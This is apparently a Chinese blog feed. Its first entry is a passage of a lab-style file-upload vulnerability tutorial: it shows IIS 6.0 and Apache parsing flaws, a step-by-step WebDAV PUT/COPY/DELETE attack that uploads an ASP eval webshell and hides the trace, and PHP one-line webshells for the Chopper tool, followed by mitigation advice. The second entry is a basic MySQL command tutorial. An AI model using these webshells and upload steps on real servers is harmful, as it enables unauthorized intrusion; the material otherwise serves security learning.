<p>查看webshell.php中的代码，写入的shell.php和一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173056947.png" alt="image-20200406171117818"></p>
<p>页面选择webshell.php进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173400254.png" alt="image-20200406173056947"></p>
<p>可以查看upload文件下，发现shell.php成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173242871.png" alt="image-20200406173748738"></p>
<p>打开shell.php查看内容，这是一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173748738.png" alt="image-20200406173400254"></p>
<p>上传一句话木马后可以使用菜刀进行连接</p>
<h4 id="中间件解析漏洞-IIS6-0"><a href="#中间件解析漏洞-IIS6-0" class="headerlink" title="中间件解析漏洞 - IIS6.0"></a>中间件解析漏洞 - IIS6.0</h4><h5 id="IIS文件解析问题"><a href="#IIS文件解析问题" class="headerlink" title="IIS文件解析问题"></a>IIS文件解析问题</h5><p>IIS 6在处理文件解析时，也出过一些漏洞。前面提到的0X00字符截断文件名，在IIS和Windows环境下出过类似的漏洞，不过截断字符变成了” ; “</p>
<p>当文件名为123.asp;111.jpg时，IIS 6会将文件解析为abc.asp，文件名被阶段了，从而导致脚本被执行。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.127.25&#x2F;123.asp;111.jpg</span><br></pre></td></tr></table></figure>

<p>会执行123.asp，而不会管111.jpg</p>
<h5 id="1、IIS6-0解析漏洞介绍"><a href="#1、IIS6-0解析漏洞介绍" class="headerlink" title="1、IIS6.0解析漏洞介绍"></a>1、IIS6.0解析漏洞介绍</h5><p>解析漏洞描述：</p>
<p>解析漏洞就是上传到web服务器上的这个文件并不是.asp命名的这样一个文件，会被服务器IIS6.0这个服务器解析为asp文件，这时候就造成了非.asp后缀名的文件，被当做asp脚本执行，从而执行其中的代码</p>
<h5 id="注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的"><a href="#注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的" class="headerlink" title="注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的"></a>注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的</h5><p>1）当监理*.asp格式的文件夹时，其目录下的任意文件讲被IIS当作asp文件解析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%&#x3D;anoe()%&gt;</span><br></pre></td></tr></table></figure>

<p>在Windows sever2000当中进行测试，新建了一个站点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203537641.png" alt="image-20200406173242871"></p>
<p>打开浏览器进行访问，可以正常打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203603101.png" alt="image-20200406203537641"></p>
<p>在站点的根目录新建一个文件夹1.asp</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203656148.png" alt="image-20200406203844038"></p>
<p>下面进行访问，访问1.asp下的1.txt文本，发现并没有输入NOW而是将文本变成了asp执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203844038.png" alt="image-20200406204342863"></p>
<p>2）当文件*.asp;1.jpg IIS6.0同样会将文件作为asp文件解析</p>
<p>在根目录下新建一个a.asp;1.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204342863.png" alt="image-20200406203656148"></p>
<p>在文本中写入   &lt;%NOW()%&gt;   asp内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204447988.png" alt="image-20200406203743363"></p>
<p>进行访问这个网址a.asp;1.txt，页面也没有返回NOW而是返回了当前时间</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204520970.png" alt="image-20200406204447988"></p>
<h5 id="2、IIS6-0-PUT上传原理"><a href="#2、IIS6-0-PUT上传原理" class="headerlink" title="2、IIS6.0 PUT上传原理"></a>2、IIS6.0 PUT上传原理</h5><p>WebDAV基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE等功能，它所包含的PUT方法，允许用户上传文件到指定路径下。</p>
<p>在许多Web Sever 中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，则会支持PUT方法，再结合MOVE方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行WebShell。MOVE能否执行成功取决于IIS服务器是否勾选了”脚本资源访问”复选框</p>
<p>如果要实施这个攻击过程，攻击者应先通过<strong>OPTIONS方法探测服务器支持的HTTP方法类型</strong>，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写脚本文件</p>
<p>​        1、探测是否存在IIS PUT 漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果探测过程中出现了对应支持的这些方法，那就说明存在IIS PUT漏洞</span><br><span class="line">&#x2F;&#x2F; 当然也有很多中间件支持PUT</span><br><span class="line">OPTIONS&#x2F;HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br></pre></td></tr></table></figure>

<p>​        2、上传txt文本文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果上面探测出PUT方法，就可以使用PUT然后设置对应的上传位置，将他传到根目录下的a.txt</span><br><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length：30	</span><br><span class="line"></span><br><span class="line">&lt;%eval reques(&quot;chopper&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>​        3、通过Move或Copy重名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 上传之后是上传了一个txt文本文档，这时候就需要copy将其拷贝到其他位置</span><br><span class="line">&#x2F;&#x2F; 比如将a.txt拷贝到cmd.asp,这时候txt文件就会被重命名为cmd.asp</span><br><span class="line">COPY&#x2F;a.txt HTTP1.1 </span><br><span class="line">HOST：www.xxx.com</span><br><span class="line">Destination：http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp</span><br></pre></td></tr></table></figure>

<p>​        4、删除</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 为了防止多余的txt文档被系统管理员看到，这个时候就是用delete来删除根目录下的a.txt</span><br><span class="line">DELETE&#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br></pre></td></tr></table></figure>

<h5 id="3、IIS6-0-PUT上传探测"><a href="#3、IIS6-0-PUT上传探测" class="headerlink" title="3、IIS6.0 PUT上传探测"></a>3、IIS6.0 PUT上传探测</h5><p>可以使用OPTIONS探测，也可以使用自动化工具探测</p>
<p>自动化工具探测</p>
<p>使用nikto探测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-nikto -h IP地址</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407165220436.png" alt="image-20200407165220436"></p>
<p>因为支持这几个方法所以可以确定存在IIS漏洞</p>
<h5 id="4、IIS6-0-PUT上传利用"><a href="#4、IIS6-0-PUT上传利用" class="headerlink" title="4、IIS6.0 PUT上传利用"></a>4、IIS6.0 PUT上传利用</h5><h5 id="以下内容中的asp写错了多加了一个括号和-符号"><a href="#以下内容中的asp写错了多加了一个括号和-符号" class="headerlink" title="以下内容中的asp写错了多加了一个括号和@符号"></a>以下内容中的asp写错了多加了一个括号和@符号</h5><p>正确格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% eval request(&quot;cmd&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>利用burpsuite进行IIS PUT漏洞利用。先OPTIONS探测、PUT、MOVE、DELETE</p>
<p>截断对应数据包，修改对应的方法OPTIONS进行探测，如果返回了200，并且返回了对应的支持方法，这个时候可以判断他是支持IIS PUT</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406213544157.png" alt="image-20200406211007871"></p>
<p>探测完就要上传一个文本</p>
<p>在红线处将OPTIONS改为PUT/123.txt，在紫色下划线地方写入asp脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@eval request(&quot;cmd&quot;))%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406213837106.png" alt="image-20200406213837106"></p>
<p>修改为配置点击GO，这样根目录下就会多一个123.txt文本，也可以在右面response中看到HTTP相应是201也就是创建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406214030356.png" alt="image-20200406214030356"></p>
<p>在根目录查看是否有一个123.txt，如果有查看123.txt中的内容</p>
<p>发现确实凡在，并且内容也是asp脚本内容</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407165452805.png" alt="image-20200407165452805"></p>
<p>上传完成之后就需要进行MOVE重命名或者COPY拷贝</p>
<p>打开网址输入网址的URL进行抓包，将其配置信息修改</p>
<p>将GET修改为COPY，拷贝的内容是123.txt，可以将Host以下的内容全部删除</p>
<p>写入Destination：URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Destination：http:&#x2F;&#x2F;192.168.1.110&#x2F;123.asp;aaa.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215120458.png" alt="image-20200407090323746"></p>
<p>点击GO进行执行，返回HTTP201表示完成</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215207644.png" alt="image-20200407085144478"></p>
<p>查看根目录下是否有这个文件，发现文件确实存在，说明执行成功</p>
<p>当然也可以改为其他名称，但要符合解析漏洞的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215305346.png" alt="image-20200407090357703"></p>
<h5 id="以上代码存在错误，已在开头表明，这里已经修改完成"><a href="#以上代码存在错误，已在开头表明，这里已经修改完成" class="headerlink" title="以上代码存在错误，已在开头表明，这里已经修改完成"></a>以上代码存在错误，已在开头表明，这里已经修改完成</h5><p>使用菜刀进行连接，成功连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406220049997.png" alt="image-20200406213544157"></p>
<h4 id="Apache文件解析漏洞"><a href="#Apache文件解析漏洞" class="headerlink" title="Apache文件解析漏洞"></a>Apache文件解析漏洞</h4><h5 id="1、Apache环境搭建"><a href="#1、Apache环境搭建" class="headerlink" title="1、Apache环境搭建"></a>1、Apache环境搭建</h5><p>Apache和PHP采用module的方式结合</p>
<p>只有Apache和php采用moudule的方式来进行结合时才有解析漏洞，虽然可以和其他的结合但是不存在解析漏洞</p>
<p>这样就需要下载单独的Apache和PHP，在Apache下hettpd.conf文件，将对应的PHP文件加载进来</p>
<p>安装完Apache后在文件夹下的conf中的httpd.conf进行配置</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407083714517.png" alt="image-20200406214803116"></p>
<p>加载对应的模块LoadModule php5_module “路径”将文件中在带的dll进行加载</p>
<p>设置PHP初始化目录PHPIniDir “目录”</p>
<p>以及对一些文件进行解析AddType application/x-httpd-php   .php   .html  .htm，加上这些后缀名是只对这些后缀名进行解析</p>
<p>如果使用这种情况，会出现错误的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407084557317.png" alt="image-20200406215120458"></p>
<h5 id="2、Apache解析漏洞介绍"><a href="#2、Apache解析漏洞介绍" class="headerlink" title="2、Apache解析漏洞介绍"></a>2、Apache解析漏洞介绍</h5><p>因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名不可识别的，就继续往左判断，直到判断到文件名为止</p>
<p>官方解释：<a href="http://httpd.apache.org/docs/current/mod/directive-dict.html" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/mod/directive-dict.html</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407085144478.png" alt="image-20200406215207644"></p>
<p>比如：1.php.xxxx 这个文件有两个文件后缀名，一个是php一个是xxxx，当Apache从右向左进行解析时，先解析后缀名.xxxx发现不然是继续向左解析，解析到.php，Apache认识就会当做PHP解析</p>
<h5 id="注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。"><a href="#注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。" class="headerlink" title="注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。"></a>注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。</h5><h5 id="3、解析漏洞利用演示"><a href="#3、解析漏洞利用演示" class="headerlink" title="3、解析漏洞利用演示"></a>3、解析漏洞利用演示</h5><p>在站点目录下新建一个1.php.xxxx文件，xxxx文件后缀名为无法识别的后缀名。其中内容为phpinfo();</p>
<p>在Apache下的htdocs下新建一个1.php .xxxx</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090153504.png" alt="image-20200406215305346"></p>
<p>打开cmd使用ipconfig获取ip地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090323746.png" alt="image-20200406220049997"></p>
<p>在浏览器当中进行访问，这样就会输出对应的phpinfo，由此可以确定这个文件会被Apache当做php文件格式，并传递给php.exe进行执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090357703.png" alt="image-20200407090153504"></p>
<p>传递到这里，进行执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090628805.png" alt="image-20200407083714517"></p>
<h5 id="4、利用场景介绍"><a href="#4、利用场景介绍" class="headerlink" title="4、利用场景介绍"></a>4、利用场景介绍</h5><p>在Web程序总存在文件上传，但是有黑名单验证时，利用该解析漏洞可以上传对应各WebShell到目标服务器</p>
<p>比如：</p>
<p>传递一句话木马，使用菜刀连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@vale($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>例如使用1.php.xxxx的文件内容修改为一句话木马，然后使用中国菜刀进行连接，连接时同样是这个文件，但是会被Apache当做php来进行判断，判断它为php文件，这时候就会调用php.exe进行解析，然后就成功连接到中国菜刀的一句话WebShell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407091010103.png" alt="image-20200407084557317"></p>
<h4 id="文件上传修复建议"><a href="#文件上传修复建议" class="headerlink" title="文件上传修复建议"></a>文件上传修复建议</h4><ul>
<li><p>通过白名单的方式判断文件后缀名是否合法</p>
</li>
<li><p>对上传的文件名进行重命名。</p>
</li>
<li><pre><code>例如：
    rand(10,99).date(&quot;YmdHis&quot;).&quot;.jpg&quot;。</code></pre></li>
</ul>
<h4 id="设计安全的文件上传功能"><a href="#设计安全的文件上传功能" class="headerlink" title="设计安全的文件上传功能"></a>设计安全的文件上传功能</h4><h5 id="1、文件上传的目录设置为不可执行"><a href="#1、文件上传的目录设置为不可执行" class="headerlink" title="1、文件上传的目录设置为不可执行"></a>1、文件上传的目录设置为不可执行</h5><p>只要web容器无法解析该目录下的内容，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。</p>
<h5 id="2、判断文件类型"><a href="#2、判断文件类型" class="headerlink" title="2、判断文件类型"></a>2、判断文件类型</h5><p>在判断文件类型时，可以结合使用MIME Type、后缀名检查等方法。在文件类型检查中，强烈推荐使用白名单，黑名单的方式不可靠。对于图片的处理，可以使用压缩函数resize()函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
<h5 id="3、使用随机数该写文件名和文件路径"><a href="#3、使用随机数该写文件名和文件路径" class="headerlink" title="3、使用随机数该写文件名和文件路径"></a>3、使用随机数该写文件名和文件路径</h5><p>文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传，但不能访问，如果应用使用随机数改写了文件的路径，将极大地增加了攻击的成本。与此同时，像shell.php.rar.rar这种文件，或者是crossdomain.xml这种文件，都将因为文件名被改写而无法成功实施攻击</p>
<h5 id="4、单独设置文件服务器的域名"><a href="#4、单独设置文件服务器的域名" class="headerlink" title="4、单独设置文件服务器的域名"></a>4、单独设置文件服务器的域名</h5><p>由于浏览器同资源策略的关系，一系列客户端攻击将失效，比如上传rossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决</p>
<p>当然这只是简单的文件上传预防，如果还要考虑病毒、木马、色情图片与视频，反政治文件等等，需要做的就非常多了，文件上传看似简单，但要实现一个安全的上传功能是非常不容易的</p>
]]></content>
  </entry>
  <entry>
    <title>MySQL数据库</title>
    <url>/2020/04/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h3 id="MySQL数据库优点"><a href="#MySQL数据库优点" class="headerlink" title="MySQL数据库优点"></a>MySQL数据库优点</h3><ul>
<li><h5 id="持久化数据到本地"><a href="#持久化数据到本地" class="headerlink" title="持久化数据到本地"></a>持久化数据到本地</h5></li>
<li><h5 id="可以实现结构化查询，方便管理"><a href="#可以实现结构化查询，方便管理" class="headerlink" title="可以实现结构化查询，方便管理"></a>可以实现结构化查询，方便管理</h5></li>
<li><h5 id="成本低：开源，免费使用"><a href="#成本低：开源，免费使用" class="headerlink" title="成本低：开源，免费使用"></a>成本低：开源，免费使用</h5></li>
<li><h5 id="性能高：移植性好"><a href="#性能高：移植性好" class="headerlink" title="性能高：移植性好"></a>性能高：移植性好</h5></li>
<li><h5 id="体积小便于安装"><a href="#体积小便于安装" class="headerlink" title="体积小便于安装"></a>体积小便于安装</h5></li>
</ul>
<h3 id="数据的概念"><a href="#数据的概念" class="headerlink" title="数据的概念"></a>数据的概念</h3><ul>
<li><strong>DB</strong><ul>
<li><strong>数据库(database)</strong>：存储数据的<strong>“仓库”</strong>。它<strong>保存了一系列有组织的数据。</strong></li>
</ul>
</li>
<li><strong>DBMS</strong><ul>
<li><strong>数据管理系统(Database Management System)</strong>。数据库是<strong>通过DBMS创建和操作的容器，又被称为数据</strong></li>
<li><strong>数据库管理系统-DBMS</strong>用于 <strong>检索数据、插入数据、更新数据、删除数据</strong></li>
</ul>
</li>
<li><strong>SQL</strong><ul>
<li><strong>结构化查询语言(Structure Query Language)</strong>：<strong>专门用来与数据库通信的语言</strong></li>
</ul>
</li>
</ul>
<h5 id="SQL的优点："><a href="#SQL的优点：" class="headerlink" title="SQL的优点："></a>SQL的优点：</h5><h5 id="1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL"><a href="#1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL" class="headerlink" title="1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL"></a>1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL</h5><h5 id="2、简单易学"><a href="#2、简单易学" class="headerlink" title="2、简单易学"></a>2、简单易学</h5><h5 id="3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作"><a href="#3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作" class="headerlink" title="3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作"></a>3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作</h5><h3 id="数据库存储数据的特点"><a href="#数据库存储数据的特点" class="headerlink" title="数据库存储数据的特点"></a>数据库存储数据的特点</h3><h5 id="1、将数据放到表中，表再放到库中"><a href="#1、将数据放到表中，表再放到库中" class="headerlink" title="1、将数据放到表中，表再放到库中"></a>1、将数据放到表中，表再放到库中</h5><h5 id="2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。"><a href="#2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。" class="headerlink" title="2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。"></a>2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。</h5><h5 id="3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。"><a href="#3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。" class="headerlink" title="3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。"></a>3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。</h5><h5 id="4、-表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”"><a href="#4、-表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”" class="headerlink" title="4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”"></a>4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”</h5><h5 id="5、表中的数据是按行存储的，每一行类似于java中的”对象”。"><a href="#5、表中的数据是按行存储的，每一行类似于java中的”对象”。" class="headerlink" title="5、表中的数据是按行存储的，每一行类似于java中的”对象”。"></a>5、表中的数据是按行存储的，每一行类似于java中的”对象”。</h5><h3 id="常见数据库管理系统"><a href="#常见数据库管理系统" class="headerlink" title="常见数据库管理系统"></a>常见数据库管理系统</h3><p>MySQL、Oracle、db2、SQL server</p>
<h3 id="登录和退出MySQL"><a href="#登录和退出MySQL" class="headerlink" title="登录和退出MySQL"></a>登录和退出MySQL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录指令</span><br><span class="line">mysql -h localhost -P 3306 -u root -p</span><br><span class="line">登录指令简写</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">退出指令</span><br><span class="line">exit	或者	ctrl+c</span><br></pre></td></tr></table></figure>

<h3 id="MySQL的常见命令"><a href="#MySQL的常见命令" class="headerlink" title="MySQL的常见命令"></a>MySQL的常见命令</h3><h5 id="其中，mysql、information-schema、performance-schema这三个库是不能随便动的"><a href="#其中，mysql、information-schema、performance-schema这三个库是不能随便动的" class="headerlink" title="其中，mysql、information_schema、performance_schema这三个库是不能随便动的"></a>其中，mysql、information_schema、performance_schema这三个库是不能随便动的</h5><ul>
<li><h5 id="mysql（用于保存用户信息的）"><a href="#mysql（用于保存用户信息的）" class="headerlink" title="mysql（用于保存用户信息的）"></a>mysql（用于保存用户信息的）</h5></li>
<li><h5 id="information-schema（用于保存原数据信息）"><a href="#information-schema（用于保存原数据信息）" class="headerlink" title="information_schema（用于保存原数据信息）"></a>information_schema（用于保存原数据信息）</h5></li>
<li><h5 id="performance-schema（用于搜集性能信息，性能参数）"><a href="#performance-schema（用于搜集性能信息，性能参数）" class="headerlink" title="performance_schema（用于搜集性能信息，性能参数）"></a>performance_schema（用于搜集性能信息，性能参数）</h5></li>
<li><p>test（表示测试数据库，这个库里面是空的，没有表，可以在里面去新建表，可以修改库删除库）</p>
</li>
</ul>
<h5 id="每条命令结尾都要加分号-（非常重要）"><a href="#每条命令结尾都要加分号-（非常重要）" class="headerlink" title="每条命令结尾都要加分号;（非常重要）"></a>每条命令结尾都要加分号;（非常重要）</h5><h5 id="插入sql文件，也就是插入数据库"><a href="#插入sql文件，也就是插入数据库" class="headerlink" title="插入sql文件，也就是插入数据库"></a>插入sql文件，也就是插入数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; source sql文件位置</span><br></pre></td></tr></table></figure>

<h5 id="查看当前所有数据库"><a href="#查看当前所有数据库" class="headerlink" title="查看当前所有数据库"></a>查看当前所有数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<h5 id="进入库的指令是"><a href="#进入库的指令是" class="headerlink" title="进入库的指令是"></a>进入库的指令是</h5><h5 id="use-库名；"><a href="#use-库名；" class="headerlink" title="use 库名；"></a>use 库名；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#use 后面加上指定库名，这里进入的就是test库，结尾不要忘记加分号;</span><br><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed	#返回一个database changed表示打开了test库</span><br></pre></td></tr></table></figure>

<h5 id="查看库中的表"><a href="#查看库中的表" class="headerlink" title="查看库中的表"></a>查看库中的表</h5><h5 id="show-tables；"><a href="#show-tables；" class="headerlink" title="show tables；"></a>show tables；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看当前库中的表用 show tables</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty set (0.00 sec)	#返回结果empty set 表示空的</span><br></pre></td></tr></table></figure>

<h5 id="查看其他库的所有表"><a href="#查看其他库的所有表" class="headerlink" title="查看其他库的所有表"></a>查看其他库的所有表</h5><h5 id="show-tables-from-库名；"><a href="#show-tables-from-库名；" class="headerlink" title="show tables from 库名；"></a>show tables from 库名；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这样也可以查看其他库的表</span><br><span class="line">mysql&gt; show tables from mysql;</span><br></pre></td></tr></table></figure>

<h5 id="声明：如果用use进入当前库之后，再用show-tables-from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里"><a href="#声明：如果用use进入当前库之后，再用show-tables-from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里" class="headerlink" title="声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里"></a>声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这里use先进入的test库，虽然用show tables from查看了其他库的表，但是位置还是再test里面</span><br><span class="line">例如:</span><br><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables from mysql;</span><br><span class="line">		库里面表的内容</span><br></pre></td></tr></table></figure>

<h5 id="查看所在的库"><a href="#查看所在的库" class="headerlink" title="查看所在的库"></a>查看所在的库</h5><h5 id="select-database"><a href="#select-database" class="headerlink" title="select database();"></a>select database();</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database 库名;</span><br></pre></td></tr></table></figure>

<h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database 库名;</span><br></pre></td></tr></table></figure>

<h5 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h5><h5 id="create-table-表名"><a href="#create-table-表名" class="headerlink" title="create table 表名;"></a>create table 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：creact table 表名(</span><br><span class="line">		列名 列类型,</span><br><span class="line">		列名 列类型</span><br><span class="line">		...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用create table 创建一个handsome的表，表是由列组成的，加一个id列，这个列的类型是int类型，还有一个name列，它的类型是字符串，varchar，20表示可以存储最多20个字符，也就是字符串的最大长度，varchar是可变字符串的意思</span><br><span class="line">mysql&gt; create table handsome(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; name varchar(20));</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">#用show tables;查看当前库中的表</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_test |</span><br><span class="line">+----------------+</span><br><span class="line">| handsome       |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop table 表名;</span><br></pre></td></tr></table></figure>

